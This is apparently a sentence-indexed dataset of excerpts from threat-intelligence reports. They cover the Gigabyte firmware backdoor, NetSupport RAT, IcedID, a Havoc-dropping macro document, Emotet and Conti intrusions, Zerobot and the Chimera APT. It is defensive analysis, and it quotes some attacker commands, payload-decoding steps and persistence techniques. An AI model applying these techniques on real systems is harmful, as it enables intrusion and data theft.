PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20). ","4639":"RtlDecompressBuffer decompresses the provided buffer. ","4640":"CreateProcessInternalW creates a new process.","4641":"In the context of malware execution, it can create a new threat with the malicious unpacked payload. ","4642":"We can look for these system calls in the list of imported functions.","4643":"However, malware authors usually try to hide these system calls.","4644":"For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.","4645":"In this case, the function and the corresponding library are dynamically loaded at runtime \u2013 also known as explicit linking. ","4646":"In this case, dynamic debugging can be very helpful \u2013 debuggers like x64dbg let you put a breakpoint on function calls, even if the function is not imported.","4647":"The breakpoint will be triggered if the system call is executed. ","4648":"Debugger A debugger is a powerful tool that allows developers and researchers to follow and control the execution of a program.","4649":"When debugging an executable, you can view the registers, stack, and memory and see how each instruction affects the stored data. ","4650":"Debugging malware can reveal code executed only in runtime (meaning that you will not see it in standard static analysis).","4651":"Debuggers also allow you to see how strings and payloads are deobfuscated and constructed \u2013 making it easier to find the interesting patterns of the malware. ","4652":"Different debuggers can be used to debug Windows executables and DLLs: OllyDbg \u2013 not maintained anymore Windbg \u2013 powerful kernel-mode and user-mode debugger created by Microsoft. ","4653":"x64dbg \u2013 reliable and user-friendly.","4654":"For 32-bit executables, it\u2019s x32dbg. ","4655":"The main difference between these debuggers is the implementation, which may result in certain behaviors, but for the most part, it\u2019s up to you to choose which debugger you prefer. ","4656":"There are more tools for debugging (and analyzing) .NET","4657":"executables and other Windows executables, but that\u2019s not covered in this blog.

LoJack DoubleAgent) abused by threat actors and even firmware implants such as Sednit LoJax, MosaicRegressor, Vector-EDK.","4712":"Subsequent analysis showed that this same code is present in hundreds of models of Gigabyte PCs.","4713":"We are working with Gigabyte to address this insecure implementation of their app center capability. ","4714":"In the interest of protecting organizations from malicious actors, we are also publicly disclosing this information and defensive strategies on a more accelerated timeline than a typical vulnerability disclosure.","4715":"This backdoor appears to be implementing intentional functionality and would require a firmware update to completely remove it from affected systems.","4716":"While our ongoing investigation has not confirmed exploitation by a specific threat actor, an active widespread backdoor that is difficult to remove poses a supply chain risk for organizations with Gigabyte systems.","4717":"At a high level, the relevant attack vectors include: Compromise in the supply chain Compromise in the local environment Malware persistence via functionality of this firmware in systems A more detailed analysis of these risks is provided with suggested mitigations below.","4718":"After a more traditional vulnerability disclosure timeline, we plan to publish details about how this works. ","4719":"Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process. ","4720":"This executable binary insecurely downloads and executes additional payloads from the Internet. ","4721":"Since many more issues like this continue to be discovered, Eclypsium is continuously running at-scale analysis of the information technology supply chain.","4722":"Look for additional findings on this blog and the Eclypsium Platform for your organization. ","4723":"Stage 1:","4724":"Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin ","4725":"This is a Windows Native Binary executable embedded inside of UEFI firmware binary in a UEFI firmware volume with the following GUID: AEB1671D-019C-4B3B-BA-00-35-A2-E6-28-04-36. ","4726":"This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.","4727":"During the Driver Execution Environment (DXE) phase of the UEFI firmware boot process, the \u201cWpbtDxe.efi\u201d firmware module uses the above GUID to load the embedded Windows executable file into memory, installing it into a WPBT ACPI table which will later be loaded and executed by the Windows Session Manager Subsystem (smss.exe) upon Windows startup.","4728":"The \u201cWpbtDxe.efi\u201d module checks if the \u201cAPP Center Download & Install\u201d feature has been enabled in the BIOS\/UEFI Setup before installing the executable into the WPBT ACPI table.","4729":"Although this setting appears to be disabled by default, it was enabled on the system we examined. ","4730":"This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: ","4731":"%SystemRoot%\\system32\\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.","4732":"The mechanism described here is similar to the methods used by other UEFI firmware implants such as LoJax, MosiacRegressor, MoonBounce, and Vector-EDK, referenced previously. ","4733":"Stage 2: Downloading and running further executables ","4734":"The dropped Windows executable is a .NET application.","4735":"It downloads and runs an executable payload from one of the following locations, depending on how it\u2019s been configured: http:\/\/mb.download.gigabyte.com\/FileList\/Swhttp\/LiveUpdate4 https:\/\/mb.download.gigabyte.com\/FileList\/Swhttp\/LiveUpdate4 https:\/\/software-nas\/Swhttp\/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.","4736":"However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.","4737":"Therefore, MITM is possible in that case also. ","4738":"The firmware does not implement any cryptographic digital signature verification or any other validation over the executables.","4739":"The dropped executable and the normally-downloaded Gigabyte tools do have a Gigabyte cryptographic signature that satisfies the code signing requirements of Microsoft Windows, but this does little to offset malicious use, especially if exploited using Living-off-the-Land techniques (like in the recent alert regarding Volt Typhoon attackers).","4740":"As a result, any threat actor can use this to persistently infect vulnerable systems either via MITM or compromised infrastructure. Risks and Impact These issues expose organizations to a wide range of risks and attack scenarios. ","4741":"Abuse of an OEM backdoor by threat actors \u2013 Previously, threat actors have taken advantage of legitimate but insecure\/vulnerable \u201cOEM backdoor\u201d software built into the firmware of PCs.","4742":"Most notably, Sednit group (APT28, FancyBear) exploited Computrace LoJack to masquerade as legitimate laptop anti-theft feature. ","4743":"Compromise of the OEM update infrastructure and supply chain \u2013 Gigabyte does have documentation on their website for this feature so it may be legitimate, but we cannot confirm what is happening within Gigabyte.","4744":"In August 2021, Gigabyte experienced a breach of critical data by the RansomEXX group and then experienced another breach in October 2021 by the AvosLocker group. ","4745":"Persistence using UEFI Rootkits and Implants \u2013 UEFI rootkits and implants are some of the stealthiest and most powerful forms of malware in existence.","4746":"They reside in firmware on motherboards or within EFI system partitions of storage media, and execute before the operating system, allowing them to completely subvert the OS and security controls running in higher layers.","4747":"Additionally, since most of the UEFI code exists on the motherboard instead of storage drives, UEFI threats will easily persist even if drives are wiped and the OS is reinstalled.","4748":"The rate of discovery of new UEFI rootkits has accelerated sharply in recent years as seen by the discovery of LoJax (2018), MosaicRegressor (2020), FinSpy (2021) ESPecter (2021), MoonBounce (2022), CosmicStrand (2022), and BlackLotus (2023).","4749":"Most of these were used to enable persistence of other, OS-based malware.","4750":"This Gigabyte firmware images and the persistently dropped Windows executable enable the same attack scenario.","4751":"Often, the above implants made their native Windows executables look like legitimate update tools.","4752":"In the case of MosaicRegressor, the Windows payload was named \u201cIntelUpdater.exe\u201d MITM attacks on firmware and software update features \u2013 Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.","4753":"It is also important to note that the third connection option, https:\/\/software-nas\/Swhttp\/LiveUpdate4 , is not a fully qualified domain name, but rather, a machine name that would presumably be on the local network.","4754":"This means an attacker on a local subnet could trick the implant into connecting to their system, without the need for DNS spoofing. ","4755":"Ongoing risk due to unwanted behavior within official firmware \u2013 Backdoors hidden within UEFI or other firmware can be hard to remove.","4756":"Even if the backdoor executable is removed, the firmware will simply drop it again the next time the system boots up.","4757":"This challenge was demonstrated before when trying to remove Computrace LoJack and relates to vulnerabilities in Lenovo Service Engine on notebooks and desktops. ","4758":"Recommendations We recommend exercising caution when using Gigabyte systems or systems with affected motherboards.","4759":"Organizations can also take the following actions to minimize the risk: Scan and monitor systems and firmware updates in order to detect affected Gigabyte systems and the backdoor-like tools embedded in firmware.","4760":"Update systems to the latest validated firmware and software in order to address security issues like this one. Inspect and disable the \u201cAPP Center Download & Install\u201d feature in UEFI\/BIOS Setup on Gigabyte systems and set a BIOS password to deter malicious changes.

","4768":"NetSupport RAT has been observed in numerous attacks on enterprise environments over the years, and Pokemon is just the latest in a long line of creative lures used to distribute and drop NetSupport RAT.","4769":"It is frequently used by cybercriminals as a \u2018quick solution\u2019 in lieu of implementing something more bespoke. ","4770":"In this post, we provide an overview of NetSupport RAT and discuss the technical details of a recent campaign. ","4771":"Background NetSupport RAT is based on NetSupport Manager, a legitimate tool which is frequently used by bad actors for malicious purposes in ways similar to TeamViewer.","4772":"NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.","4773":"Once the client has been installed, attackers can access, acquire, and manipulate any data on the device (exfiltrate data, execute additional payloads).","4774":"In addition, the software allows at least the following: Real-time screen monitoring, optimized for monitoring multiple devices Taking control or redirect user screens Capturing screenshots, audio, video Malicious versions are constantly being sold or rented out via underground crime marketplaces. ","4775":"NetSupport Manager RAT offered for rental As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work \u2018out of the box\u2019.","4776":"Additionally, it is thoroughly documented and actively supported: benefits that are less likely with custom-built malware that provides similar functionality such as Andromeda, Nanocore, CirenegRAT, Dark Comet and others. ","4777":"Malicious use of NetSupport Manager (aka NetSupport RAT) has been observed since at least late 2017.","4778":"The use of \u201clegitimate\u201d or COTS (Commercial off the Shelf) tools is highly beneficial to attackers when attempting to achieve the greatest degree of stealth.","4779":"Custom-written malware can often be detected by some layer of protection, such as EPP and EDR tools, so it is often advantageous to utilize a legitimate tool, even if it takes some creativity to deliver the remote software client. ","4780":"ASEC reported that the NetSupport RAT droppers were delivered via phishing emails that entice targets to install a \u201cPokemon card game\u201d.","4781":"On doing so, the victim unknowingly installs the NetSupport RAT, a doctored version of the NetSupport Manager client (client32.exe) that gives the attacker immediate and direct control of the infected device.","4782":"While this specific attack was centered around the Pokemon theme, other phishing lures are known to be used. ","4783":"Some recent NetSupport RAT campaigns utilize .ISO","4784":"files as droppers.","4785":"This allows the attackers to evade certain types of detection.","4786":"This technique has been used by ransomware actors as well such as by both Maze and Ragnar Locker. ","4787":"When opened, the ISO files will contain either the NetSupport RAT installer (with configs\/support files) or a .LNK file redirecting the victim to said installer. ","4788":"Technical Details A typical example of this kind of .ISO file is the sample CLF_security.iso (288603f501926756c236e368a1fdc7d128f4f9a1).

","4792":"NetSupport RAT installer disguised as Google Chrome setup. ","4793":"The sample is obfuscated via the Babadeda crypter.","4794":"When executed, a base64 encoded string is used to specify various parameters including sessionID and other critical values to the NetSupport connection. ","4795":"Base64 encoded RAT execution command The command decodes to look similar to the following: NetSupport RAT decoded command Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.","4796":"For example: ~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetSupport.url In this case, the shortcut links to \\AppData\\Roaming\\Steelray","4797":"Project Viewer","4798":".","4799":"In addition, the sample generates a scheduled task with multiple triggers. ","4800":"NetSupport RAT Persistence via Scheduled Task Install directory of NetSupport RAT The RAT performs a number of discovery operations to understand its host environment.","4801":"Network adapter details are pulled via GetAdaptersAddresses.","4802":"Additional data is gleaned via WMI queries such as: SELECT *","4803":"FROM Win32_ComputerSystem SELECT *","4804":"FROM Win32_SystemEnclosure ","4805":"The malware deploys some anti-analysis measures such as attempting to detect the presence of a debugger via IsDebuggerPresent, and all running processes are enumerated and logged via EnumProcesses (32-bit processes).","4806":"Launch behavior, including delays in execution or outgoing connection, can be controlled by the attacker.","4807":"For example, Sleep statements may be used to delay execution by hours in order to trick sandboxes used in malware analysis or simply to disguise the association between the infection and the social engineering event from the user. ","4808":"Network requirements vary across different NetSupport Manager configurations and sessions.","4809":"In the analyzed sample, the client opens a port on TCP 50275 to receive network connections. ","4810":"NetSupport RAT has the ability to drop and execute additional components.","4811":"In this particular campaign, system\/log data and executable code is dropped into %temp%. ","4812":"NetSupport RAT data in %temp%. ","4813":"Data files and executables are also written to ~\\Program Files (x86) \\Google\\Temp.","4814":"These files are all self-deleted after launch or full installation of the attacker configuration.","4815":"A large number of legitimate Google Chrome support files are also written to this location.","4816":"These are used by the malware in order to facilitate the fake Google Chrome installation. ","4817":"Conclusion NetSupport Manager is a long-standing tool which, like TeamViewer, has unfortunately attracted ample use by cybercriminals.","4818":"NetSupport RAT, once installed, is very robust and powerful, and threat actors are able to masquerade the dropper or installer in any way they see fit.","4819":"In addition, threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software.

","4979":"According to Proofpoint, these new variants have been seen used by three distinct threat actors in seven campaigns since late last year, focusing on further payload delivery, most notably ransomware. ","4980":"Proofpoint has identified two new variants of the IcedID loader, namely \u201cLite\u201d (first seen in November 2022) and \u201cForked\u201d (first observed in February 2023), both delivering the same IcedID bot with a more narrow-focused feature set. ","4981":"Removing unneeded functions on IcedID, which has been deployed in numerous malicious campaigns without many code changes since 2017, makes it stealthier and leaner, which can help the threat actors evade detection. ","4982":"Separate clusters of IcedID activity (Proofpoint) New IcedID campaigns Starting in November 2022, the \u201cLite\u201d variant of the IcedID loader was delivered as a second-stage payload on systems infected by the newly-returned Emotet malware.

","4988":"It is important to note that while some threat actors use new variants of the IcedID malware, others still choose to deploy the \u201cStandard\u201d variant, with one of the most recent campaigns dating March 10, 2023. ","4989":"The new variants The \u201cForked\u201d IcedID loader is quite similar to the \u201cStandard\u201d version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot. ","4990":"However, \u201cForked\u201d uses a different file type (COM Server) and features additional domain and string-decryption code, making the payload 12KB larger than the \u201cStandard\u201d version. ","4991":"Domains decryption (Proofpoint) On the other hand, the \u201cLite\u201d loader variant is lighter, at 20KB, and does not exfiltrate host info to the C2.","4992":"This change makes sense since it was deployed alongside Emotet, which had already profiled the breached system. ","4993":"The \u201cForked\u201d version of the IcedID bot is 64KB smaller than the \u201cStandard\u201d bot, and is basically the same malware minus the web injects system, the AiTM (adversary in the middle) functions, and the backconnect capabilities that give threat actors remote access to infected devices. ","4994":"Standard and Forked bot comparison (Proofpoint) IcedID is generally used for initial access by threat actors, so developing new variants is a worrying sign, signifying a shift towards specializing the bot to payload delivery. ","4995":"Proofpoint predicts that most threat actors will continue to use the \u201cStandard\u201d variant, but the deployment of new IcedID versions will likely grow, and more variants may pop up later in 2023.

","5655":"Figure 2: Fake document after macro execution VBA Code Analysis To complicate analysis and attempt to evade detection, the macro\u2019s VBA code employs a few interesting techniques. ","5656":"The Word application crashes when trying to view or debug the VBA code in the document.","5657":"Similarly, when the document composition is analyzed using oletools (a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive.","5658":"The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file.","5659":"We have not confirmed if either of these anomalies directly led to the crash above.","5660":"Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document.

","5665":"To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.","5666":"In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. ","5667":"As an anti-debugging technique, execution of the primary infection routine uses the Application.","5668":"OnTime function commonly used to schedule the execution of a specific VBA procedure instead of directly calling it.","5669":"In this case, it schedules the immediate execution of the function \u201costrategicy\u201d.","5670":"When debugging, this line of code produces the error, \u201cCan\u2019t execute code in break mode\u201d, and then stops executing.

","5682":"Figure 4: Encoded binary payload Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction.","5683":"In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes.","5684":"It does this by trying to find the node name, in this case, \u201cTwXfx\u201d, with an appended index, i.e., \u201cTwXfx_0\u201d.","5685":"If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1).","5686":"It repeats this until it fails to find a node, which means it has reached the end of the payload. ","5687":"Once a node is found, the content of the node is read, and its XML tags are removed.","5688":"Furthermore, if a string \u201c__b_\u201d is found at the beginning of the data, it is also removed.","5689":"Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.","5690":"Only this time, the resulting bytes are further decoded with xor 82.","5691":"The decoded payload is a 64-bit executable (.exe). ","5692":"The storage of a payload binary as a custom XML part of the document is a technique very similar to what\u2019s presented in this blog from the website mgeeky.tech.","5693":"Even on the code level, there are striking similarities between the code used by the malicious document and what\u2019s presented in that blog.","5694":"The website author offers a private tool that provides similar capabilities.","5695":"Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.","5696":"Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. ","5697":"Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path \u201cC:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\u201d and executed using ShellExecute with the following command line: ","5698":"C:\\Windows\\System32\\conhost.exe --headless \"C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\" \"\u201d This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section.

","5973":"After a successful takedown thanks to Interpol and Eurojust efforts, Emotet was resurrected in November 2021 with the help of Trickbot malware.","5974":"Since then, Emotet has been testing different initial access payloads while its developers were busy improving the core functionality of the actual malware.","5975":"Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions. ","5976":"In a few weeks, we\u2019ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware.

","5979":"The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.","5980":"After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers. ","5981":"Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.","5982":"This entailed connecting to various email servers and sending new emails with attached xls and zip files.","5983":"This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again. ","5984":"Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.","5985":"Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.","5986":"Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.","5987":"Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast. ","5988":"At 29 hours from initial access, the threat actors began their first lateral movement.","5989":"This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.","5990":"From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.","5991":"Pass-the-Hash behavior was observed targeting several accounts on the lateral host.","5992":"Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs. ","5993":"The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.","5994":"More account discovery was then observed, with queries for Domain Administrators and a backup account. ","5995":"At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.","5996":"Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.","5997":"After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.","5998":"During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC. ","5999":"They returned the next day, at the same time as the previous day, and picked up where they left off.","6000":"They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.","6001":"Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.","6002":"Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.","6003":"Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.","6004":"Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.

Ransomware url: https:\/\/thedfirreport.com\/2021\/05\/12\/conti-ransomware\/ Introduction First seen in May 2020, Conti ransomware has quickly become one of the most common ransomware variants, according to Coveware.","6119":"As per Coveware\u2019s Quarterly Ransomware Report (Q1 2021), Conti has the 2nd highest market share after Sodinokibi, which we wrote about here. ","6120":"In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours.","6121":"The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning.","6122":"The hands on keyboard activity lasted for two and a half hours.","6123":"They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems. ","6124":"Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.","6125":"The JavaScript file would eventually download and execute the IcedID malware.","6126":"Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. ","6127":"While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.","6128":"After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.","6129":"The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.","6130":"They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality. ","6131":"The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.","6132":"During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.","6133":"After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. ","6134":"Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.","6135":"This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080. ","6136":"To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.","6137":"Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification. ","6138":"Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.","6139":"Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.","6140":"The ransomware note left by the infection included a link to their Tor site for further details. ","6141":"After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid. ","6142":"Services We offer multiple services including a Threat Feed service which tracks Cobalt Strike, Metasploit, Empire, PoshC2, etc.","6143":"More information on this service and others can be found here. ","6144":"We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. ","6145":"Timeline Analysis and reporting completed by @pigerlin, @MetallicHack, @yatinwad, and 1 unnamed contributor. ","6146":"Reviewed by @kostastsale, @RoxpinTeddy, and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.","6147":"Brad had a few posts about these around the time of this intrusion.","6148":"1 2 Thanks Brad!

","6238":"Zerobot, a Go-based botnet that spreads primarily through IoT and web application vulnerabilities, is an example of an evolving threat, with operators continuously adding new exploits and capabilities to the malware.","6239":"The Microsoft Defender for IoT research team has been monitoring Zerobot (also called ZeroStresser by its operators) for months.","6240":"Zerobot is offered as part of a malware as a service scheme and has been updated several times since Microsoft started to track it.","6241":"One domain with links to Zerobot was among several domains associated with DDoS-for-hire services seized by the FBI in December 2022. ","6242":"Microsoft has previously reported on the evolving threat ecosystem.","6243":"The shift toward malware as a service in the cyber economy has industrialized attacks and has made it easier for attackers to purchase and use malware, establish and maintain access to compromised networks, and utilize ready-made tools to perform their attacks.","6244":"We have tracked advertisements for the Zerobot botnet on various social media networks in addition to other announcements regarding the sale and maintenance of the malware, as well as new capabilities in development. ","6245":"In this blog post, we present information about the latest version of the malware, Zerobot 1.1, including newly identified capabilities and further context to Fortinet\u2019s recent analysis on the threat.","6246":"Zerobot 1.1 increases its capabilities with the inclusion of new attack methods and new exploits for supported architectures, expanding the malware\u2019s reach to different types of devices.","6247":"In addition to these findings, we\u2019re sharing new indicators of compromise (IOCs) and recommendations to help defenders protect devices and networks against this threat.

","6473":"In their intrusions they regularly abuse cloud services from Google and Microsoft to achieve their goals.","6474":"NCC Group and Fox-IT observed this threat actor during various incident response engagements performed between October 2019 until April 2020.","6475":"Our threat intelligence analysts noticed clear overlap between the various cases in infrastructure and capabilities, and as a result we assess with moderate confidence that one group was carrying out the intrusions across multiple victims operating in Chinese interests. ","6476":"In open source this actor is referred to as Chimera by CyCraft. ","6477":"NCC Group and Fox-IT have seen this actor remain undetected, their dwell time, for up to three years.","6478":"As such, if you were a victim, they might still be active in your network looking for your most recent crown jewels. ","6479":"We contained and eradicated the threat from our client\u2019s networks during incident response whilst our Managed Detection and Response (MDR) clients automatically received detection logic. ","6480":"With this publication, NCC Group and Fox-IT aim to provide the wider community with information and intelligence that can be used to hunt for this threat in historic data and improve detections for intrusions by this intrusion set. ","6481":"Throughout we use terminology to describe the various phases, tactics, and techniques of the intrusions standardized by MITRE with their ATT&CK framework .","6482":"Near the end of this article all the tactics and techniques used by the adversary are listed with links to the MITRE website with more information. ","6483":"From initial access to defense evasion: how it is done In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.","6484":"The objective in these cases appear to be stealing sensitive data from the victim\u2019s networks. ","6485":"Credential theft and password spraying to Cobalt Strike This adversary starts with obtaining usernames and passwords of their victim from previous breaches.","6486":"These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.","6487":"After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.","6488":"Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.","6489":"As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.","6490":"With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.","6491":"With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.","6492":"From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control. ","6493":"Network discovery and lateral movement ","6494":"The adversary continues their discovery of the victim\u2019s network from patient zero.","6495":"Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.","6496":"If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.","6497":"Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.","6498":"After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.","6499":"If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.","6500":"The adversary is typically able to perform all the steps described above within one day. ","6501":"During this process, the adversary identifies data of interest from the network of the victim.","6502":"This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.","6503":"If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.","6504":"However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary. ","6505":"After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.","6506":"At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.","6507":"But this isn\u2019t done consistently across their engagements. ","6508":"Framing the adversary\u2019s work in the MITRE ATT&CK framework Credential access (TA0006) ","6509":"The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.","6510":"The more recent intrusions took place in 2019 at companies in the aviation industry.","6511":"The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry. ","6512":"The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.","6513":"Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.","6514":"They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.","6515":"Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.","6516":"While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain>\\<username>.","6517":"And attempted logins came from a relative small set of IP-addresses. ","6518":"For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying. ","6519":"Initial access (TA0001) ","6520":"In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there. ","6521":"In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.","6522":"This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.","6523":"Within an hour after grabbing this document, the adversary accessed the company portal with the valid account. ","6524":"From this portal it was possible to launch the web-based VPN.","6525":"The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.","6526":"It was possible to configure an alternate phone number for the logged in user account at the company portal.","6527":"The adversary used this opportunity to configure an alternate phone number controlled by the adversary. ","6528":"By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.","6529":"However, they also made a mistake during this process within one incident.","6530":"Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.","6531":"However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).","6532":"NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.","6533":"Thus the 2FA code was sent with supporting Chinese text. ","6534":"Account discovery (T1087) With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).","6535":"But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands: net user net user Administrator net user <username>","6536":"\/domain net localgroup administrators If the user account doesn\u2019t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin\u2019s usernames.","6537":"To identify if privileged users are active on 